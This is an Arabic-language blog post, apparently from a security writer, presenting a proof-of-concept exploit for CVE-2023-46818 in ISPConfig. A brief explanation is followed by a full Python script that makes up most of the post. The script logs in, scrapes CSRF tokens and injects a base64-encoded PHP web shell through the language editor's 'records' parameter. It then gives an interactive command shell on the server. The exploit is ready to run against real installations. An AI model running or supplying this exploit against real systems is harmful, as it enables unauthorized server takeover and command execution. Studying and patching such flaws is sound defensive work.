---
title: CVE-2023-46818 PoC
date: 2025-08-01
categories: 'Exploit Development'
description: سكربت بايثون يستغل ثغرة command injection في نظام ispconfig ويرفع ويب شيل على السيرفر.
tags: ["Exploit Development"]
categories: "Exploit_Development"
---
# نبذة عن الثغرة
في تطبيق ispconfig قبل الإصدار رقم 3.2.11p1  يوجد ثغرة command injection  في البارامتر `records` أثناء تغيير اللغة الخاصة بالتطبيق, نقدر من خلالها نرفع webshell على السيرفر ثم نتواصل معها وننفذ أوامر على النظام. نبدأ السكربت بدالة `check_connection` اللي تتأكد أن الاتصال مع الهوست ممكن، ثم نروح لدالة `login` اللي هدفها تسجيل الدخول باستخدام البيانات المزودة ثم إرجاع الكوكيز عشان نستخدمها في الطلبات الجاية. بعدها دالة `injection` اللي من خلالها نرفع ملف اللغة `lng.` على السيرفر ثم ناخذ ال csrf key/id عشان نكمل عملية رفع الملف, بعد ما نرفع الملف نقدر نرسل طلبات على النقطة `admin/46818.php/` عشان ننفذ أوامر على النظام وهذا هو عمل الدالة الأخيرة `exploit`. نلاحظ إني غيرت كود ال php إلى شيء أبسط وهو بارامتر `l` نعطيه الأمر وهو ينفذه. الثغرة موجودة في [github](https://github.com/vulnerk0/CVE-2023-46818) الخاص بي.

```python
#!/usr/bin/python
from bs4 import BeautifulSoup
import requests
import sys
import random
import base64

def check_connection(url):
    print(f'[!] Checking connection to the target: {url}')
    try: 
        req = requests.get(url)
    except:
        print('[-] Could not reach the target, check the url/port and the vpn connection')
        exit()
    print('[+] Target is reachable, logging in with the provided creds.')
    return 



def login(url,username,password):
    data = {'username': username, 'password': password, 's_mod': 'login', 's_pg': 'index'}
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    try:
        login_req = requests.post(f'{url}login/index.php',allow_redirects=False, data=data, headers=headers)
    except requests.exceptions.RequestException as e:
        print(f'[-] An error occured {e}')
        exit()
    try:
        cookie = login_req.headers['Set-Cookie']
        headers = {'Cookie': cookie}
        check_req = requests.get(f'{url}index.php', headers=headers)
        if not 'logout.php' in check_req.text:
            print('[-] Could not login using the provided credentials')
            exit()
    except:
        print(f'[-] An error has occured, check that the url points to the root of the website')
        exit()
    print('[+] Logged in using the provided credentials!')
    return cookie

def injection(url, cookie):
    url = f'{url}admin/language_edit.php'
    phpcode_string = "<?php system($_GET['l']); ?>".encode('ascii')
    b64bytes = base64.b64encode(phpcode_string)
    encoded_payload = b64bytes.decode('ascii')
    injection_code = f"'];file_put_contents('46818.php',base64_decode('{encoded_payload}'));die;#"
    chars = 'qwertyuioplkjhgfdsazxcvbnm'
    chars_list = list(chars)
    random.shuffle(chars_list)
    rand_file_name = ''.join(chars_list)
    lang_file = f'{rand_file_name}.lng'
    
    data = {'lang':'en', 'module':'help', 'lang_file': lang_file}
    headers = {'Cookie': cookie}
    try:
        req = requests.post(url, data=data, headers=headers)
    except requests.exceptions.RequestException as e:
        print(f'[-] An error has occured {e}')
    try:
        soup = BeautifulSoup(req.text, 'html.parser')
        csrf_id = soup.find(attrs={'name':'_csrf_id'})['value']
        csrf_key = soup.find(attrs={'name':'_csrf_key'})['value']
    except:
        print('[-] Could not grab the csrf tokens (id, key)')
        exit()
    print('[!] Grabbed the csrf key and id')
    
    data = {'lang':'en', 'module':'help', 'lang_file': lang_file,'_csrf_id': csrf_id, '_csrf_key':csrf_key, 'records[\\]':injection_code}
    try:
        req = requests.post(url, data=data, headers=headers)
    except requests.exceptions.RequestException as e:
        print(f'[-] An error has occured {e}')
def exploit(url, cookie):
    url = f'{url}admin/46818.php'
    print(f'[!] Launching shell!')
    headers = {'Cookie': cookie}
    try:
        req = requests.get(f'{url}?l=ls', headers=headers)
        if req.ok:
            print('[#] The shell has been uploaded, prompting you now...')
        else:
            print('[-] The shell hasn\'t been uploaded, maybe try again!')
    except:
        print('[-] Error while trying to access the shell file')
    while True:
        cmd = input("Shell# ")
        print(cmd)
        if cmd == 'exit':
            print('[^^] Bye.')
            exit()
        req = requests.get(f'{url}?l={cmd}', headers=headers)
        print(req.text)



def main():
    if len(sys.argv) != 4:
        print(f'[!] Usage: python {sys.argv[0]} <URL> <USERNAME> <PASSWORD>')
        exit()
    url = sys.argv[1]
    if not url.endswith('/'):
        url += '/'
    username = sys.argv[2]
    password = sys.argv[3]
    check_connection(url)
    cookie = login(url,username,password)
    injection(url, cookie)
    exploit(url, cookie)
if __name__ == '__main__':
    main()
```